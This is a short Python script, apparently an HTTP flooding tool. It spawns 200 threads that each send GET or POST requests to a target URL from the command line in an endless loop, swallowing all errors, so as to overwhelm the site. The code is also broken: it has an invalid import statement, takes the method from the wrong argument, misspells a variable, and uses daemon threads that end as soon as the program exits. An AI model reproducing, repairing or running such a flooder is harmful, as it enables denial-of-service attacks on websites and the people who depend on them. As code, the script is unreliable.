from sys import argv
from threading import Thread
import user_agent from utils.headers

import requests

method = argv[0]
url = argv[1]
threads = []

headers = {}

def sendReq(method: str, url: str, user_agent: str):
  if method == "get":
    headers["Content-Type"] = "text/html"
    while 1:
      try:
        requests.get(url, headers=headers)
      except:
        pass
  if method == "post":
    headers["Content-Type"] = "application/json"
    while 1:
      try:
        requests.post(url, headers=headers)
      except:
        pass

if __name__ == "__main__":
  for _ in range(200):
    t = Thread(target=sendReq, args=[
      memthod,
      url,
      user_agent()
    ], daemon=True)
    threads.append(t)
  for thread in threads:
    try:
      thread.start()
    except:
      print("Error creating Thread")